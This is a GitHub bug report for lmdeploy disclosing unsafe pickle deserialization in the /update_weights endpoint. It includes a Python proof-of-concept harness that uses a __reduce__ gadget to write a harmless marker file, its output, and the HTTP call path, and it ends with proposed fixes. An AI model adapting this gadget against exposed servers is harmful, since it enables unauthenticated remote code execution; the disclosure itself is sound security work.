# [Issue #4698] [Bug] /update_weights deserializes request-controlled pickle data before validation

source: https://github.com/InternLM/lmdeploy/issues/4698
state: open | updated: 2026-09-14T11:34:22Z
labels: 

## 正文

### Checklist

- [x] 1. I have searched related issues but cannot get the expected help.
- [x] 2. The bug has not been fixed in the latest version.
- [ ] 3. Please note that if the bug-related issue you submitted lacks corresponding environment info and a minimal reproducible demo, it will be challenging for us to reproduce and resolve the issue, reducing the likelihood of receiving feedback.

### Describe the bug

`POST /update_weights` accepts the JSON field `serialized_named_tensors` as a `str | list[str] | dict` and forwards the request object directly to the backend weight-update implementation.

When the value is a string, both backend paths deserialize request-controlled bytes with `multiprocessing.reduction.ForkingPickler.loads(...)`:

- TurboMind backend: `lmdeploy/turbomind/turbomind.py`, `TurboMind.update_params`
- PyTorch backend: `lmdeploy/pytorch/engine/model_agent/agent.py`, `ModelAgent.update_params`

In CPython, `ForkingPickler.loads` resolves to native `_pickle.loads`. This means a remote HTTP request body can reach native pickle deserialization before any tensor/weight structure validation. Pickle reconstruction callbacks can run during loading, so this is an unsafe deserialization issue in the API server process.

Since the endpoint lacks authentication by default and binds to a public-facing address (0.0.0.0), this flaw allows any remote attacker who can reach the server to execute arbitrary system commands via crafted __reduce__ callbacks during deserialization, effectively granting unauthenticated remote code execution (RCE) without any prior credentials.

The API server defaults make the path easier to expose accidentally:

- `lmdeploy serve api_server` defaults to `--server-name 0.0.0.0`
- `api_keys` defaults to `None`
- authentication middleware is only installed when non-empty API keys are configured

### Reproduction

From a checkout of `lmdeploy`, I used this  local harness. It stubs heavyweight CUDA/model dependencies, imports the target `lmdeploy/turbomind/turbomind.py` file, and calls the real `TurboMind.update_params` method. The marker appears before the later expected `TypeError`, showing that deserialization happened before weight-shape/structure handling.

```bash
python repro_update_weights_deser.py
```

`repro_update_weights_deser.py`:

```python
import base64
import importlib.util
import pickle
import sys
import types
from pathlib import Path


repo = Path.cwd()
out = Path("update_weights_deser_marker.txt").resolve()


class Marker:
    def __reduce__(self):
        return (out.write_text, ("target update_params deserialized payload\n",))


class _Cuda:
    @staticmethod
    def device(_dev):
        class Ctx:
            def __enter__(self):
                return None

            def __exit__(self, exc_type, exc, tb):
                return False

        return Ctx()

    @staticmethod
    def current_device():
        return 0


def install_stubs():
    torch = types.ModuleType("torch")
    torch.Tensor = object
    torch.cuda = _Cuda
    torch.IntTensor = lambda value: value
    torch.from_dlpack = lambda value: value
    sys.modules["torch"] = torch

    pybase64 = types.ModuleType("pybase64")
    pybase64.b64decode = base64.b64decode
    sys.modules["pybase64"] = pybase64

    lmdeploy = types.ModuleType("lmdeploy")
    lmdeploy.__file__ = str(repo / "lmdeploy" / "__init__.py")
    lmdeploy.__path__ = [str(repo / "lmdeploy")]
    sys.modules["lmdeploy"] = lmdeploy

    messages = types.ModuleType("lmdeploy.messages")
    for name in [
        "EngineOutput",
        "GenerationConfig",
        "ResponseType",
        "ScheduleMetrics",
        "TurbomindEngineConfig",
    ]:
        setattr(messages, name, type(name, (), {}))
    sys.modules["lmdeploy.messages"] = messages

    protocol = types.ModuleType("lmdeploy.serve.openai.protocol")
    protocol.UpdateParamsRequest = type("UpdateParamsRequest", (), {})
    sys.modules["lmdeploy.serve"] = types.ModuleType("lmdeploy.serve")
    sys.modules["lmdeploy.serve.openai"] = types.ModuleType("lmdeploy.serve.openai")
    sys.modules["lmdeploy.serve.openai.protocol"] = protocol

    tokenizer = types.ModuleType("lmdeploy.tokenizer")
    tokenizer.Tokenizer = type("Tokenizer", (), {})
    sys.modules["lmdeploy.tokenizer"] = tokenizer

    utils = types.ModuleType("lmdeploy.utils")
    utils.get_logger = lambda _name=None: types.SimpleNamespace(
        info=lambda *a, **k: None,
        warning=lambda *a, **k: None,
        error=lambda *a, **k: None,
        debug=lambda *a, **k: None,
    )
    utils.get_max_batch_size = lambda _device: 1
    utils.get_model = lambda model, *a, **k: model
    sys.modules["lmdeploy.utils"] = utils

    tm_pkg = types.ModuleType("lmdeploy.turbomind")
    tm_pkg.__path__ = [str(repo / "lmdeploy" / "turbomind")]
    sys.modules["lmdeploy.turbomind"] = tm_pkg

    supported = types.ModuleType("lmdeploy.turbomind.supported_models")
    supported.is_supported = lambda *a, **k: True
    sys.modules["lmdeploy.turbomind.supported_models"] = supported

    tm_native = types.ModuleType("_turbomind")
    tm_native.TensorMap = dict
    tm_native.DataType = types.SimpleNamespace(TYPE_UINT32=1, TYPE_INT32=2)
    sys.modules["_turbomind"] = tm_native
    sys.modules["_xgrammar"] = types.ModuleType("_xgrammar")

    tokenizer_info = types.ModuleType("lmdeploy.turbomind.tokenizer_info")
    tokenizer_info.TokenizerInfo = type("TokenizerInfo", (), {})
    sys.modules["lmdeploy.turbomind.tokenizer_info"] = tokenizer_info


def load_target_module():
    path = repo / "lmdeploy" / "turbomind" / "turbomind.py"
    spec = importlib.util.spec_from_file_location("lmdeploy.turbomind.turbomind", path)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = mod
    spec.loader.exec_module(mod)
    return mod


if out.exists():
    out.unlink()

install_stubs()
target = load_target_module()
payload = base64.b64encode(pickle.dumps(Marker())).decode()
request = types.SimpleNamespace(serialized_named_tensors=payload, finished=False)
self_obj = types.SimpleNamespace(devices=[0])

print("loads_module", getattr(pickle.loads, "__module__", None))
print("marker_before", out.exists())
try:
    target.TurboMind.update_params(self_obj, request)
except Exception as exc:
    print("target_exception_after_loads", type(exc).__name__, str(exc))
print("marker_after", out.exists())
if out.exists():
    print("marker_text", out.read_text().strip())
```

Observed output:

```text
loads_module _pickle
marker_before False
target_exception_after_loads TypeError 'int' object is not iterable
marker_after True
marker_text target update_params deserialized payload
```

The `TypeError` is expected because this harness intentionally uses a harmless marker object instead of a real weight iterator. The important observation is that the marker file is written before the later weight-handling error.

A real HTTP path to the same sink is:

```text
POST /update_weights
  -> UpdateParamsRequest.serialized_named_tensors
  -> api_server.update_params(...)
  -> VariableInterface.async_engine.engine.update_params(request)
  -> pybase64.b64decode(request.serialized_named_tensors)
  -> ForkingPickler.loads(...)
  -> native _pickle.loads(...)
```

### Environment

```Shell
The issue is source-level and the local harness does not require a model or GPU.

Manual environment used for the local verification:


Repo commit: d9b2613182f1f94225b33239fd8dcc8903a984ce
OS: Ubuntu 24.04.3 LTS under WSL2
Python: 3.13.9
GCC/G++: 13.3.0
```

### Error traceback

```Shell
The local harness output is:


loads_module _pickle
marker_before False
target_exception_after_loads TypeError 'int' object is not iterable
marker_after True
marker_text target update_params deserialized payload


The exception happens after `_pickle.loads` returns and after the marker side effect has occurred.
The root cause appears to be accepting pickle-serialized weight data over HTTP and loading it before any schema, type, signature, or allowlist validation.
Avoid pickle for HTTP weight updates. Prefer a safe tensor serialization format such as `safetensors` plus explicit metadata validation.
```

## 评论 (2)

### Solaris-star · 2026-07-21

Opening a fix: HTTP `/update_weights` rejects pickled string payloads; engine pickle loads require `LMDEPLOY_ALLOW_PICKLE_UPDATE_PARAMS=1` for trusted IPC only.

### gokay-ai · 2026-09-14

Looking into this — will reject pickle over the HTTP `/update_weights` path (and gate any engine pickle behind an explicit opt-in) so request-controlled data is not deserialized before validation.
